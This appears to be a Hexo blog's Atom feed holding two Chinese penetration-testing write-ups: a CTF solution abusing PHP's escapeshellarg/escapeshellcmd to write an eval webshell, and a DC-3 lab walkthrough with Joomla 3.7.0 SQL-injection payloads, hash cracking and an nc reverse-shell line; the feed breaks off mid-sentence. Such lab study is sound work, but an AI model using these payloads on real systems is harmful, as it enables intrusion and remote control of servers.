<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NoahBox</title>
  
  <subtitle>Hell is Other People.</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-04-27T14:46:51.633Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>NoahTie</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php中的escapeshellarg+escapeshellcmd漏洞</title>
    <link href="http://example.com/2021/04/27/escapeshell&amp;escapecmd%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/04/27/escapeshell&amp;escapecmd%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-27T14:34:00.000Z</published>
    <updated>2021-04-27T14:46:51.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php中的escapeshellarg-escapeshellcmd漏洞"><a href="#php中的escapeshellarg-escapeshellcmd漏洞" class="headerlink" title="php中的escapeshellarg+escapeshellcmd漏洞"></a>php中的escapeshellarg+escapeshellcmd漏洞</h1><h2 id="0x01-escapeshellarg-与escapecmd"><a href="#0x01-escapeshellarg-与escapecmd" class="headerlink" title="0x01 escapeshellarg()与escapecmd()"></a>0x01 <code>escapeshellarg()</code>与<code>escapecmd()</code></h2><p><code>escapeshellarg()</code>与<code>escapecmd()</code>是php预置的用于防范命令注入攻击的函数，官方文档中给出的用法如下：</p><hr><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><blockquote><p><em>(PHP 4, PHP 5, PHP 7, PHP 8)</em><br>escapeshellcmd — shell 元字符转义</p><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p><strong>escapeshellcmd</strong>    ( string <code>$command</code>   ) : string<br><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗shell命令执行任意命令的字符进行转义。此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或<a href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。  </p><p>反斜线（\）会在以下字符之前插入：   &amp;#;`|*?~&lt;&gt;^()[]{}$\, <code>\x0A</code>   和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对的时候被转义。   在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。  </p><a id="more"></a><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><code>command</code>: 要转义的命令。           </p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>转义后的字符串。  </p></blockquote><hr><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><blockquote><p><em>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7, PHP 8)</em><br>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p><h4 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h4><p><strong>escapeshellarg</strong>    ( string <code>$arg</code>   ) : string<br><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含  <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php">system()</a>    <a href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a> 。  </p><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p><code>arg</code>: 需要被转码的参数。           </p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>转换之后字符串。  </p></blockquote><hr><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><img src="https://i.loli.net/2021/04/27/YEziXVo6DFwdZBC.png" alt="image-20210427175517136"></p><ul><li><p><code>escapeshellarg()</code>将字符串以特殊符号为分割进行拆分，并在拆分后的字符串首尾加上单引号，在单独的符号前加上了反斜线。</p><p>通过另外一例可以更明显地看出来这一点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> escapeshellarg(<span class="string">&quot;Hanshu said:&#x27;i&#x27;m god!&#x27;&quot;</span>);</span><br><span class="line"><span class="string">&#x27;Hanshu said:&#x27;</span>\<span class="string">&#x27;&#x27;</span>i<span class="string">&#x27;\&#x27;&#x27;</span>m god!<span class="string">&#x27;\&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>经过这一步处理之后的字符串可以在终端中“安全”地输出：</p><p><img src="https://i.loli.net/2021/04/27/ZhHwjGQtubs56CR.png" alt="image-20210427180547821"></p></li></ul><ul><li><code>escapeshellcmd()</code>为字符串中的特殊符号前添加反斜线。</li></ul><h2 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h2><h3 id="一个PHPMailer中的漏洞的简易分析"><a href="#一个PHPMailer中的漏洞的简易分析" class="headerlink" title="一个PHPMailer中的漏洞的简易分析"></a>一个PHPMailer中的漏洞的简易分析</h3><p>关于这两个函数的漏洞，在网上可以找到的最早的出处是PHPMailer的官方为了修复5.2.18前版本中出现的RCE漏洞而引入的新漏洞。</p><p>PHPMailer源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mailSend</span>(<span class="params">$header, $body</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $toArr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;to <span class="keyword">as</span> $toaddr) &#123;</span><br><span class="line">        $toArr[] = <span class="keyword">$this</span>-&gt;addrFormat($toaddr);</span><br><span class="line">    &#125;</span><br><span class="line">    $to = implode(<span class="string">&#x27;, &#x27;</span>, $toArr);</span><br><span class="line">    </span><br><span class="line">    $param = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender) <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;validateAddress(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $param = sprintf(<span class="string">&#x27;-f%s&#x27;</span>, escapeshellarg(<span class="keyword">$this</span>-&gt;Sender));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender) <span class="keyword">and</span> !ini_get(<span class="string">&#x27;safe_mode&#x27;</span>) <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;validateAddress(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $old_from = ini_get(<span class="string">&#x27;sendmil_from&#x27;</span>);</span><br><span class="line">        ini_set(<span class="string">&#x27;sendmail_from&#x27;</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* and more */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php_mail的源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (force_extra_parameters) &#123;</span><br><span class="line">    extra_cmd = php_escape_shell_cmd(force_extra_parameters);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (extra_cmd) &#123;</span><br><span class="line">    extra_cmd = php_escape_shell_cmd(extra_cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (php_mail(to_r, subject_r, message, headers_trimmed, extra_cmd TSRMLS_CC)) &#123;</span><br><span class="line">    RETVAL_TRUE;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    RETVAL_FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到PHPMailer的源代码中第11行使用了<code>escapeshellarg()</code>，而在源码调用的php方法的源码的第3行中，又调用了<code>phpescapeshellcmd()</code>。</p><p>正是这两个函数的连续调用造成了漏洞。</p><p>将这个流程进行简化，大致就是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">&quot;127.0.0.1&#x27; -o 1.php&quot;</span>;</span><br><span class="line">    $cmd = escapeshellcmd(escapeshellarg($payload));</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line">system(<span class="string">&quot;curl &quot;</span> . $cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里模拟了调用curl来获取文本页面回显，但是这里的payload导致原本应该回显在页面上的文本被保存为文件<code>1.php</code>。</p><p><img src="https://i.loli.net/2021/04/27/2y3QmOZP4JDNiUn.png" alt="image-20210427212505557"></p><p>可以发现进行过处理之后，payload变成了<code>&#39;127.0.0.1&#39;\\&#39;&#39; -o 1.php\&#39;</code>。在这个payload传入系统后发生了这些事情：</p><ul><li><code>&#39;127.0.0.1&#39;</code>当作引号包裹起来的字符串传入指令，相当于<code>127.0.0.1</code>。</li><li><code>\\</code>被转义为单独的反斜杠，被当作网址后的路径分隔符。</li><li><code>&#39;&#39;</code>成对的单引号被shell忽略。</li><li><code>-o 1.php</code>被当作传入的参数，即原本在单引号中的字符串的一部分逃逸了引号，变成了参数。</li><li><code> \&#39;</code>反斜杠转义的单引号。</li></ul><h3 id="漏洞的局限性及应对方法"><a href="#漏洞的局限性及应对方法" class="headerlink" title="漏洞的局限性及应对方法"></a>漏洞的局限性及应对方法</h3><p>如上例，最终保存的文件名将会是<code>1.php&#39;</code>，而并非我们期望的<code>1.php</code>。在许多指令中，只需要在<code>1.php</code>与<code>&#39;</code>之间添加一个空格即可。这时，引号将被当作单独的参数使用。</p><h2 id="0x03-来看例题吧"><a href="#0x03-来看例题吧" class="headerlink" title="0x03 来看例题吧"></a>0x03 来看例题吧</h2><h3 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h3><p>[<a href="https://buuoj.cn/challenges#[BUUCTF_2018\]Online_Tool](https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool)">https://buuoj.cn/challenges#[BUUCTF_2018\]Online_Tool](https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool)</a></p><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>3-5行、13-16行创建了一个目录，nmap指令将在这个目录下运行。</p><p>10-12行是漏洞产生的位置，和PHPMailer中漏洞产生的原理相同，我们只需要想办法让指令输出文件到目录下就行。</p><p>因为转义的缘故，shell的<code>&gt;</code>无法使用，但nmap有输出到文件的命令行参数<code>-oG</code>，构造payload：<code>&#39; &lt;?php eval($_POST[noah]);?&gt; -oG 1.php &#39; </code></p><p><img src="https://i.loli.net/2021/04/27/KMftYhTGOwb8kdv.png" alt="image-20210427222444764"></p><p>需要注意由于文件末尾还有其它信息，所以要加上末尾的<code>?&gt;</code>php标签。</p><p>上传payload之后用蚁剑之类的工具连接webshell。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;php中的escapeshellarg-escapeshellcmd漏洞&quot;&gt;&lt;a href=&quot;#php中的escapeshellarg-escapeshellcmd漏洞&quot; class=&quot;headerlink&quot; title=&quot;php中的escapeshellarg+escapeshellcmd漏洞&quot;&gt;&lt;/a&gt;php中的escapeshellarg+escapeshellcmd漏洞&lt;/h1&gt;&lt;h2 id=&quot;0x01-escapeshellarg-与escapecmd&quot;&gt;&lt;a href=&quot;#0x01-escapeshellarg-与escapecmd&quot; class=&quot;headerlink&quot; title=&quot;0x01 escapeshellarg()与escapecmd()&quot;&gt;&lt;/a&gt;0x01 &lt;code&gt;escapeshellarg()&lt;/code&gt;与&lt;code&gt;escapecmd()&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;escapeshellarg()&lt;/code&gt;与&lt;code&gt;escapecmd()&lt;/code&gt;是php预置的用于防范命令注入攻击的函数，官方文档中给出的用法如下：&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;escapeshellcmd&quot;&gt;&lt;a href=&quot;#escapeshellcmd&quot; class=&quot;headerlink&quot; title=&quot;escapeshellcmd&quot;&gt;&lt;/a&gt;escapeshellcmd&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;(PHP 4, PHP 5, PHP 7, PHP 8)&lt;/em&gt;&lt;br&gt;escapeshellcmd — shell 元字符转义&lt;/p&gt;
&lt;h4 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;escapeshellcmd&lt;/strong&gt;    ( string &lt;code&gt;$command&lt;/code&gt;   ) : string&lt;br&gt;&lt;strong&gt;escapeshellcmd()&lt;/strong&gt; 对字符串中可能会欺骗shell命令执行任意命令的字符进行转义。此函数保证用户输入的数据在传送到 &lt;a href=&quot;https://www.php.net/manual/zh/function.exec.php&quot;&gt;exec()&lt;/a&gt; 或&lt;a href=&quot;https://www.php.net/manual/zh/function.system.php&quot;&gt;system()&lt;/a&gt; 函数，或者 &lt;a href=&quot;https://www.php.net/manual/zh/language.operators.execution.php&quot;&gt;执行操作符&lt;/a&gt; 之前进行转义。  &lt;/p&gt;
&lt;p&gt;反斜线（\）会在以下字符之前插入：   &amp;amp;#;`|*?~&amp;lt;&amp;gt;^()[]{}$\, &lt;code&gt;\x0A&lt;/code&gt;   和 &lt;code&gt;\xFF&lt;/code&gt;。 &lt;code&gt;&amp;#39;&lt;/code&gt; 和 &lt;code&gt;&amp;quot;&lt;/code&gt; 仅在不配对的时候被转义。   在 Windows 平台上，所有这些字符以及 &lt;code&gt;%&lt;/code&gt; 和 &lt;code&gt;!&lt;/code&gt; 字符都会被空格代替。  &lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>Walkthrough for DC-03</title>
    <link href="http://example.com/2021/04/27/DC-03/"/>
    <id>http://example.com/2021/04/27/DC-03/</id>
    <published>2021-04-27T03:30:00.000Z</published>
    <updated>2021-04-27T03:33:23.894Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Walkthrough-for-DC-03"><a href="#Walkthrough-for-DC-03" class="headerlink" title="Walkthrough for DC-03"></a>Walkthrough for DC-03</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line"></span><br><span class="line">DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</span><br><span class="line"></span><br><span class="line">As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.</span><br><span class="line"></span><br><span class="line">Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</span><br><span class="line"></span><br><span class="line">For those with experience doing CTF and Boot2Root challenges, this probably won&#39;t take you long at all (in fact, it could take you less than 20 minutes easily).</span><br><span class="line"></span><br><span class="line">If that&#39;s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Nmap</span> scan report for <span class="number">192.168</span><span class="number">.21</span><span class="number">.161</span></span><br><span class="line"><span class="type">Host</span> is up (<span class="number">0.00053</span>s latency).</span><br><span class="line"><span class="type">Not</span> shown: <span class="number">999</span> closed ports</span><br><span class="line"><span class="type">PORT</span>   <span class="type">STATE</span> <span class="type">SERVICE</span> <span class="type">VERSION</span></span><br><span class="line"><span class="number">80</span>/tcp open  http    <span class="type">Apache</span> httpd <span class="number">2.4</span><span class="number">.18</span> ((<span class="type">Ubuntu</span>))</span><br><span class="line">|_http-generator: <span class="type">Joomla</span>! - <span class="type">Open</span> <span class="type">Source</span> <span class="type">Content</span> <span class="type">Management</span></span><br><span class="line">|_http-server-header: <span class="type">Apache</span>/<span class="number">2.4</span><span class="number">.18</span> (<span class="type">Ubuntu</span>)</span><br><span class="line">|_http-title: <span class="type">Home</span></span><br><span class="line"><span class="type">MAC</span> <span class="type">Address</span>: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="type">C9</span>:<span class="number">9</span>C:<span class="type">BD</span> (<span class="type">VMware</span>)</span><br><span class="line"><span class="type">Device</span> <span class="class"><span class="keyword">type</span>: general purpose</span></span><br><span class="line"><span class="type">Running</span>: <span class="type">Linux</span> <span class="number">3.</span><span class="type">X</span>|<span class="number">4.</span><span class="type">X</span></span><br><span class="line"><span class="type">OS</span> <span class="type">CPE</span>: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line"><span class="type">OS</span> details: <span class="type">Linux</span> <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line"><span class="type">Network</span> <span class="type">Distance</span>: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line"><span class="type">TRACEROUTE</span></span><br><span class="line"><span class="type">HOP</span> <span class="type">RTT</span>     <span class="type">ADDRESS</span></span><br><span class="line"><span class="number">1</span>   <span class="number">0.53</span> ms <span class="number">192.168</span><span class="number">.21</span><span class="number">.161</span></span><br></pre></td></tr></table></figure><p>获取到以下信息：</p><ul><li>靶机80端口开放http服务，使用了Joomla CMS</li></ul><h3 id="AWVS扫描"><a href="#AWVS扫描" class="headerlink" title="AWVS扫描"></a>AWVS扫描</h3><p><img src="https://i.loli.net/2021/04/27/ZJhHIEODu6VzF1G.png" alt="image-20210426154257943"></p><p>确定了Joomla的版本为3.7.0。</p><p><img src="https://i.loli.net/2021/04/27/iKZyQVeHbBAa957.png" alt="image-20210426155138629"></p><p><code>/administrator</code>、<code>/component</code>、<code>/media</code>和<code>/templates</code>目录存在目录遍历。</p><p><img src="https://i.loli.net/2021/04/27/qELN7DJBFA21Yde.png" alt="image-20210426155409015"></p><p>发现了疑似管理员登陆的页面<code>/administrator</code>。</p><h3 id="JoomScan"><a href="#JoomScan" class="headerlink" title="JoomScan"></a>JoomScan</h3><p><img src="https://i.loli.net/2021/04/27/8lgoqPGyEdpc2sv.png" alt="image-20210426161224727"></p><p>没有发现什么特别的东西。</p><h2 id="Joomla管理员权限获取"><a href="#Joomla管理员权限获取" class="headerlink" title="Joomla管理员权限获取"></a>Joomla管理员权限获取</h2><p>访问Joomla首页。</p><h3 id="世界线一"><a href="#世界线一" class="headerlink" title="世界线一"></a>世界线一</h3><p>burp抓包发现明文密码传输，尝试爆破密码。</p><p><img src="https://i.loli.net/2021/04/27/tpe4rglOVIETAif.png" alt="image-20210426164845316"></p><p><img src="https://i.loli.net/2021/04/27/5ULREazZiH6IeQb.png" alt="image-20210426205738395"></p><p>爆出来了管理员密码。</p><h3 id="世界线二"><a href="#世界线二" class="headerlink" title="世界线二"></a>世界线二</h3><p>在metasploit中搜索joomla 3.7.0的利用方式。</p><p><img src="https://i.loli.net/2021/04/27/fL2v6SbI53yj9KW.png" alt="image-20210426204739616"></p><p>搜到了一个SQL注入和一个XSS，尝试利用SQL注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="line"># Date: 05-19-2017</span><br><span class="line"># Exploit Author: Mateus Lino</span><br><span class="line"># Reference: https:&#x2F;&#x2F;blog.sucuri.net&#x2F;2017&#x2F;05&#x2F;sql-injection-vulnerability-joomla-3-7.html</span><br><span class="line"># Vendor Homepage: https:&#x2F;&#x2F;www.joomla.org&#x2F;</span><br><span class="line"># Version: &#x3D; 3.7.0</span><br><span class="line"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="line"># CVE : - CVE-2017-8917</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http:&#x2F;&#x2F;localhost&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;localhost&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: list[fullordering] (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(CASE WHEN (1573&#x3D;1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600&#x3D;6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND&#x2F;OR time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT * FROM (SELECT(SLEEP(5)))GDiu)</span><br></pre></td></tr></table></figure><p>使用给出的payload使用nmap进行注入。</p><p><img src="https://i.loli.net/2021/04/27/ajFsQBJcugK2X6k.png" alt="image-20210426205927469"></p><p><img src="https://i.loli.net/2021/04/27/6UrjLK5WwJCehib.png" alt="image-20210426210018430"></p><p><img src="https://i.loli.net/2021/04/27/lRWOZoqgaBPuSyr.png" alt="image-20210426210230719"></p><p><img src="https://i.loli.net/2021/04/27/gY8F7T2d3c4zJul.png" alt="image-20210426210316849"></p><p>拿到了使用bcrypt加密的密码，使用Hashcat爆破。</p><blockquote><p><strong>Bcrypt加密算法</strong></p><p><img src="https://i.loli.net/2021/04/27/NCngLZ3REy96mih.png" alt="img"></p><ol><li>Rounds: 正数，代表hash杂凑次数，数值越高越安全，默认10次。</li><li>Salt: 盐，一个128bits随机字符串，22字符</li><li>Hash: 经过明文密码password和盐salt进行hash，个人的理解是默认10次下 ，循环加盐hash10次，得到Hash</li></ol></blockquote><p><img src="https://i.loli.net/2021/04/27/cNJIkmrBVpiOZoA.png" alt="image-20210426210905268"></p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>进入网站后台，学习了一下joomla的页面管理。个人理解joomla的页面显示依托于template，真正的网页源代码保存在<code>/administrator/templates/[template name]</code>目录下。</p><p>在后台中进入<code>Templates -&gt; Templates -&gt; Beez3 Details and Files</code>页面，上传一个反弹shell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.21.158 5555 &gt;/tmp/f&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>在linux上使用<code>nc -nlvp 5555</code>接收回传数据。</p><p>这里也可以上传一句话shell，用蚁剑连接进行终端模拟。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上传了Linux_Exploit_Suggester脚本，没有爆出来可利用的漏洞。</p><p>也没有找到可以利用的SUID，也没有配置不当的sudo权限。</p><p>在metasploit中查找可利用的EXP。</p><p><code>compgen -u</code>指令查看全部用户，发现了一个叫dc3的用户，尝试使用之前得到的密码<code>snoopy</code>进行登录，认证失败。</p><p>突然想起来一个场外因素，先前的靶机都是Debian系统，而这次使用了Ubuntu，或许有Ubuntu的CVE可用。在网上搜索了一下，Ubuntu 16.04有一个本地提权漏洞。在shell中使用<code>lsb_release 